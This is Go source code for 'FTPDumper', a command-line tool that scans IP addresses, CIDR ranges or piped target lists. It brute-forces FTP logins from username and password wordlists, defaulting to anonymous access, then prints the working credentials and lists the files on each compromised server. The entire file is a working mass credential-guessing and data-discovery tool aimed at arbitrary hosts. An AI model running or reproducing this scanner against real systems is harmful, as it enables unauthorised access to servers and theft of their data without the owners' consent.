package main

import (
	"FTPDumper/Core"
	"FTPDumper/Utility"
	"FTPDumper/ftp"
	"fmt"
	"github.com/apsdehal/go-logger"
	"github.com/integrii/flaggy"
	"os"
	"strings"
	"unicode"
)

var (
	Scanner      = "stdin"
	Users        []string
	Passwords    []string
	Ports        []string
	Limit        = 10
	OutputFolder = "files"
	Type         Core.EscannerType
	log          *logger.Logger
)

func init() {
	var err error
	log, err = logger.New("FTPDumper", 1, os.Stdout)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	flaggy.SetName("FTPDumper")
	flaggy.SetDescription("FTP Dumper")
	flaggy.SetVersion("0.0.1")

	flaggy.Int(&Limit, "l", "limit", "Task limit")
	flaggy.String(&Scanner, "s", "scanner", "Ip/CIDR scanner [stdin|filename|cidr|ip]")

	usersFile := ""
	flaggy.String(&usersFile, "user", "users", "Users file [Default User: anonymous]")

	passwordsFile := ""
	flaggy.String(&passwordsFile, "pass", "passwords", "Passwords file [Default Password: anonymous]")

	ports := ""
	flaggy.String(&ports, "p", "ports", "Ports Splited by , [Default Port: 21]")

	flaggy.String(&OutputFolder, "o", "output", "Output Folder")

	flaggy.Parse()

	switch Scanner {
	case "stdin":
		if !Utility.IsInPipeline() {
			fmt.Println("Please pipe input to the program, or use -s file/cidr")
			os.Exit(1)
		}
		Type = Core.ESTDIN

	default:
		if Utility.IsCIDRv4(Scanner) {
			Type = Core.ECIDR
		} else if Utility.IsIPv4(Scanner) {
			Type = Core.EIP
		} else if Utility.FileExists(Scanner) {
			Type = Core.EFILE
		} else {
			fmt.Println("Invalid Input, possible inputs: stdin, filename, cidr, ip")
			os.Exit(1)
		}
	}

	if Utility.FileExists(usersFile) {
		users, err := Utility.ReadFileLines(usersFile)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		Users = users
	} else {
		Users = []string{"anonymous"}
	}

	if Utility.FileExists(passwordsFile) {
		passwords, err := Utility.ReadFileLines(passwordsFile)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		Passwords = passwords
	} else {
		Passwords = []string{"anonymous"}
	}

	if ports != "" {
		portsSplited := strings.Split(ports, ",")
		for _, port := range portsSplited {
			for _, r := range port {
				if !unicode.IsDigit(r) {
					fmt.Println("Invalid Port")
					os.Exit(1)
				}
			}
			Ports = append(Ports, port)
		}
	} else {
		Ports = []string{"21"}
	}

	if !Utility.FolderExists(OutputFolder) {
		err := Utility.CreateFolder(OutputFolder)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
	}
}

func main() {
	reader := Core.NewReader(Scanner, Type)
	pool := Core.New(Limit)

	pool.Start()
	defer pool.Stop()

	for next, err := reader.Next(); next != "" && err == nil; next, err = reader.Next() {
		pool.Submit(func() {
			for _, user := range Users {
				for _, password := range Passwords {
					client := ftp.NewFTPClient(user, password)
					fmt.Printf("Connecting to %s | User: %s | Password: %s\n", next, user, password)
					err = client.Connect(fmt.Sprintf("%s:%s", next, Ports[0]))
					if err != nil {
						return
					}

					err = client.Login()
					if err != nil {
						continue
					}

					fmt.Printf("Successfully connected to %s | User: %s | Password: %s\n", next, user, password)

					files, err := client.GetFiles()
					if err != nil {
						return
					}

					for _, file := range files {
						fmt.Printf("- Name: %s | Size: %dB", file.Name, file.Size)
					}
					os.Exit(0)
				}
			}
		})
	}
}
